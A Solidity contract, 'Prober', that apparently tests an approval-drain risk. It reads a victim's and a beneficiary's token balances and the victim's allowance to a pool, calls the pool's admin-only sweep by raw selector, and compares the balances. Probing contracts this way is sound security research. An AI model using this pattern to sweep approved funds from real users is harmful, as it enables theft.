// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
interface IERC20 { function balanceOf(address) external view returns (uint256); function allowance(address,address) external view returns (uint256); }
contract Prober {
    // returns victim/benefit balances before & after running the admin-only sweep on current state
    function probe(address pool, address token, address victim, address benefit)
        external returns (uint256 vBefore, uint256 bBefore, uint256 vAfter, uint256 bAfter, uint256 allowanceToPool)
    {
        vBefore = IERC20(token).balanceOf(victim);
        bBefore = IERC20(token).balanceOf(benefit);
        allowanceToPool = IERC20(token).allowance(victim, pool);
        address[] memory arr = new address[](1);
        arr[0] = victim;
        (bool ok, ) = pool.call(abi.encodeWithSelector(0xf5121a99, token, arr));
        require(ok, "sweep-call-reverted");
        vAfter = IERC20(token).balanceOf(victim);
        bAfter = IERC20(token).balanceOf(benefit);
    }
}
